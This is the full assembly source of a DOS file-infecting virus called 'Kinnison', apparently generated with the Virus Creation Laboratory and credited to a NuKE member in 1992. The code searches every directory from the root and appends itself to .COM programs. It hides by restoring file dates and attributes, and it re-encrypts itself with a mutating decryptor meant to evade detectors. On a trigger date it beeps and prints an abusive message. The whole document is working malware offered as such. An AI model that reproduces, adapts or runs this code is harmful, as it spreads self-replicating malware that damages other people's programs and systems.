; KINNISON.ASM -- Sam Kinnison virus  
; Created by Nowhere Man's Virus Creation Labratory v0.75
; Written by Nowhere Man

virus_type	equ	0

code		segment	'CODE'
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

main		proc	near
flag:		mov	ah,0
		nop
		nop

		jmp	start			; Would be at start of victim
		nop
		nop
start:		call	find_offset		; Push IP on to stack, advance IP
find_offset:	pop	di			; DI holds old IP
		sub	di,3			; Adjust for length of CALL

		lea	si,[di + start_of_code - start]  ; SI points to code
		call	encrypt_decrypt		; Decrypt the code

start_of_code	label	near

		push	di			; Save DI
		mov	si,offset flag		; SI points to flag bytes
		lea	di,[di + new_jump - start]  ; DI points to start of jump
		movsw				; Transfer two bytes
		movsw				; Transfer two bytes
		pop	di			; Restore DI
		push	di			; And save it for later
		lea	si,[di + buffer - start]; SI points to old start
		mov	di,0100h		; DI points to start of code
		movsw				; Transfer two bytes
		movsw				; Transfer two bytes
		movsw				; Transfer two bytes
		movsb				; Transfer final byte
		pop	di			; Restore DI

		mov	bp,sp			; BP points to stack
		sub	sp,128			; Allocate 128 bytes on stack

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address on stack

		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer on stack
		int	021h

		call	get_day             
		cmp	ax,000Bh
		jne	end00
		call	get_weekday         
		cmp	ax,0005h
		jne	end00
		mov	cx,0003h
		call	beep
end00:		xor	ah,ah			; BIOS get time function
		int	01Ah
		test	dx,0001h
		jne	no_infection
		call	search_files
no_infection:
		call	get_day             
		cmp	ax,000Bh
		jne	end01
		call	get_weekday         
		cmp	ax,0005h
		jne	end01
		lea	si,[di + data00 - start]	; SI points to data
		call	display_string
end01:		pop	dx			; DX holds original DTA address
		mov	ah,01Ah			; DOS set DTA function
		int	021h

		mov	sp,bp			; Deallocate local buffer

		mov	di,0100h		; Push 0100h on to stack for
		push	di			; return to main program

		xor	ax,ax			;
		mov	bx,ax			;
		mov	cx,ax			;
		mov	dx,ax			;  Empty out the registers
		mov	si,ax			;
		mov	di,ax			;
		mov	bp,ax			;

		ret				; Return to original program
main		endp

search_files	proc	near
		push	bp			; Save BP
		mov	bp,sp			; BP points to local buffer
		sub	sp,64			; Allocate 64 bytes on stack

		mov	ah,047h			; DOS get current dir function
		xor	dl,dl			; DL holds drive # (current)
		lea	si,[bp - 64]		; SI points to 64-byte buffer
		int	021h

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[di + root - start]	; DX points to root directory
		int	021h

		call	traverse		; Start the traversal

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 64]		; DX points to old directory
		int	021h

		mov	sp,bp			; Restore old stack pointer
		pop	bp			; Restore BP
		ret				; Return to caller

root		db	"\",0			; Root directory
search_files	endp

traverse	proc	near
		push	bp			; Save BP

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh			; DOS find first function
		mov	cx,00010000b		; CX holds search attributes
		mov	dx,offset all_files	; DX points to "*.*"
		int	021h
		jc	leave_traverse		; Leave if no files present

check_dir:	cmp	byte ptr [bp - 107],16	; Is the file a directory?
		jne	another_dir		; If not, try again
		cmp	byte ptr [bp - 98],'.'	; Did we get a "." or ".."?
		je	another_dir		;If so, keep going

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 98]		; DX points to new directory
		int	021h

		call	traverse		; Recursively call ourself

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[di + up_dir - start]; DX points to parent directory
		int	021h

another_dir:	mov	ah,04Fh			; DOS find next function
		int	021h
		jnc	check_dir		; If found check the file

leave_traverse:
		lea	dx,[di + com_mask - start]  ; DX points to "*.COM"
		call	find_files		; Try to infect a file
done_searching:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah			; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller

up_dir		db	"..",0			; Parent directory name
all_files	db	"*.*",0			; Directories to search for
com_mask	db	"*.COM",0		; Mask for all .COM files
traverse	endp

find_files	proc	near
		push	bp			; Save BP

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		push	dx			; Save file mask
		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		pop	dx			; Restore file mask
find_a_file:	int	021h
		jc	done_finding		; Exit if no files found
		call	infect_file		; Infect the file!
		jnc	done_finding		; Exit if no error
		mov	ah,04Fh			; DOS find next file function
		jmp	short find_a_file	; Try finding another file

done_finding:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah			; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller
find_files	endp

infect_file	proc	near
		mov	ah,02Fh			; DOS get DTA address function
		int	021h
		mov	si,bx			; SI points to the DTA

		mov	ax,04301h		; DOS set file attributes function
		xor	cx,cx			; Clear all attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

		mov	ax,03D02h		; DOS open file function, r/w
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,03Fh			; DOS read from file function
		mov	cx,7			; CX holds bytes to read (7)
		lea	dx,[di + buffer - start]; DX points to buffer
		int	021h

		push	si			; Save DTA address before compare
		mov	byte ptr [di + set_carry - start],0  ; Assume we'll fail
		lea	si,[di + buffer - start]; SI points to comparison buffer
		push	di			; Save virus offset
		lea	di,[di + new_jump - start]  ; DI points to virus flag
		mov	cx,4			; CX holds number of bytes (4)
	rep	cmpsb				; Compare the first four bytes
		pop	di			; Restore DI
		je	close_it_up		; If equal then close up
		mov	byte ptr [di + set_carry - start],1  ; Success -- the file is OK

		cwd				; Zero CX _ Zero bytes from start
		mov	cx,dx			; Zero DX /
		mov	ax,04200h		; DOS file seek function, start
		int	021h

		mov	ax,04202h		; DOS file seek function, EOF
		cwd				; Zero DX _ Zero bytes from end
		mov	cx,dx			; Zero CX /
		int	021h

		sub	ax,7			; Prepare for JMP
		mov	word ptr [di + new_jump + 5 - start],ax  ; Construct JMP for later

		call	encrypt_code		; Make an encrypted copy of ourself

		mov	ah,040h			; DOS write to file function
		mov	cx,finish - start	; CX holds virus length
		lea	dx,[di + finish - start]	; DX points to encrypted copy
		int	021h

		cwd				; Zero DX _ Zero bytes from start
		mov	cx,dx			; Zero CX /
		mov	ax,04200h		; DOS file seek function, start
		int	021h

		mov	ah,040h			; DOS write to file function
		mov	cx,7			; CX holds bytes to write (7)
		lea	dx,[di + new_jump - start]  ; DX points to the jump we made
		int	021h

close_it_up:	pop	si			; Restore DTA address

		mov	ax,05701h		; DOS set file time function
		mov	cx,[si + 016h]		; CX holds old file time
		mov	dx,[si + 018h]		; DX holds old file date
		int	021h

		mov	ah,03Eh			; DOS close file function
		int	021h

		mov	ax,04301h		; DOS set file attributes function
		xor	ch,ch			; Clear CH for file attribute
		mov	cl,[si + 015h]		; CX holds file's old attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

infection_done:	cmp	byte ptr [di + set_carry - start],1  ; Set carry flag if failed
		ret				; Return to caller

set_carry	db	?			; Set-carry-on-exit flag
buffer		db	5 dup (090h),0CDh,020h	; Buffer to hold test data
new_jump	db	4 dup (?),0E9h,?,?	; New jump to virus
infect_file	endp


beep		proc	near
		jcxz	beep_end		; Exit if there are no beeps

		mov	ax,0E07h		; BIOS display char., BEL
beep_loop:	int	010h			; Beep
		loop	beep_loop		; Beep until --CX = 0

beep_end:	ret				; Return to caller
beep		endp

display_string	proc	near
		mov	ah,0Eh			; BIOS display char. function
display_loop:   lodsb				; Load the next char. into AL
		or	al,al			; Is the character a null?
		je	disp_strnend		; If it is, exit
		int	010h			; BIOS video interrupt
		jmp	short display_loop	; Do the next character
disp_strnend:   ret				; Return to caller
display_string	endp

get_day		proc	near
		mov	ah,02Ah			; DOS get date function
		int	021h
		mov	al,dl			; Copy day into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_day		endp

get_weekday	proc	near
		mov	ah,02Ah			; DOS get date function
		int	021h
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_weekday	endp

data00		db      "DIE BITCH!!!!! AHHHHHHHH!!!!!!!",13,10,0

vcl_marker	db	"[VCL]",0			; VCL creation marker


note		db	"Dedicated to the memory of"
		db	"   Sam Kinnison 1954-1992",0
		db	"[Kinnison]",0
		db	"Nowhere Man, [NuKE] '92",0
encrypt_code	proc	near
		push	bx			; Save BX

		push	di			; Save DI
		lea	si,[di + encrypt_decrypt - start]  ; SI points to encryption code

		xor	ah,ah			; BIOS get time function
		int	01Ah
		or	dx,1			; Insure we never get zero
		mov	word ptr [si + 5],dx	; Low word of timer is new key

alter_flag:	mov	al,0			; AL holds alteration flag
		inc	byte ptr [di + (alter_flag + 1) - start]  ; Toggle alteration flag

		test	al,1			; Is bit one set?
		jne	check_nop		; If not then don't toggle

		xor	byte ptr [si],0110b	; Change all BPs in startup code
		xor	byte ptr [si + 4],010b	; to BXs, and vice-versa
		xor	byte ptr [si + 7],0110b	;

check_nop:	test	al,2			; Is bit two set?
		jne	do_encryption		; If not then don't toggle

		mov	ax,word ptr [si + 7]	; AX holds INC/NOP
		xchg	ah,al			; Exchange position of INC and NOP
		mov	word ptr [si + 7],ax	; Put the word back

do_encryption:	mov	si,di			; SI points to start of code
		lea	di,[di + finish - start]	; DI points past code
		mov	cx,(finish - start) / 2	; CX holds words to transfer
	rep	movsw				; Copy the code past the end

		pop	di			; Restore DI
		lea	si,[di + (finish + (start_of_code - start)) - start]  ; SI points to code to encrypt
		call	encrypt_decrypt		; Encrypt the code

		pop	bx			; Restore BX
		ret				; Return to caller
encrypt_code	endp

even						; Must be on an even boundry

end_of_code	label	near

encrypt_decrypt	proc	near
		mov	bp,end_of_code - start_of_code - 2  ; BP holds length of code
xor_loop:	db	081h,032h,00h,00h	; XOR a word with the key
		dec	bp			; Do the next byte
		nop				; Used to throw off detectors
		jne	xor_loop		; Repeat until we're done
		ret				; Return to caller
encrypt_decrypt	endp
finish		label	near

code		ends
		end	main